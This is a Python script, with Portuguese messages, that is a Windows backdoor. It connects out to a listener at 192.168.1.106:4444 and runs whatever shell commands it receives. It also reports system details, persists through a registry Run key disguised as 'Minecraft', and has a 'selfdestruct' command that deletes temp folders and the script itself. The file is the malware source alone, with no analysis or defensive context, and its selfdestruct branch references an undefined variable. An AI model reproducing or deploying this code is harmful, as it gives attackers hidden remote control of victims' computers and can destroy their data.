import socket, os, subprocess, wget, sys, platform, tempfile, shutil, json, urllib
from time import sleep

def csocket():
	while True:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.connect(('192.168.1.106', 4444))
			rcmd(sock)
		except Exception:
			pass

def getIp():
    url = urllib.urlopen('http://ip-api.com/json').read()
    jsn = json.loads(url.decode('UTF-8'))

    return jsn['query']

def rcmd(sock):
	while True:
		cmd = sock.recv(1024)
		if cmd == 'pwd':
			sock.send(os.getcwd())
		elif 'cd ' in cmd:
			try:
				os.chdir(cmd[3:].strip('\n'))
				sock.send('[*]Movido para o diretorio: ' + os.getcwd())
			except Exception:
				sock.send('[-]Diretorio inexistente')
		elif cmd == 'selfdestruct':
			try:
				sock.close()
				arq_temp = ["C:/Users/{}/AppData/Local/Temp".format(username), "C:/Windows/Temp", "C:/temp"]
				for pastas in arq_temp:
					shutil.rmtree(pastas)
				os.remove(filename)
				sys.exit(0)
			except:
				os.remove(filename)
				sys.exit(0)
		elif cmd == 'sysinfo':
			sock.send('[*]System: ' + platform.platform() + ' ' + platform.release() + ' Version: ' + platform.version() + ' Architeture: ' + platform.machine())
		else:
			output = os.popen(cmd).read()
			if output:
				sock.send(output)
			else:
				sock.send('[-]Erro ao executar o comando')


if __name__ == "__main__":
	username = os.getenv('USERNAME')
	FILENAME = sys.argv[0]
	caminhoARQ = FILENAME
	TEMPDIR = tempfile.gettempdir()
	shutil.copy(FILENAME, TEMPDIR)
	os.system("REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v Minecraft /d " + caminhoARQ)
	csocket()
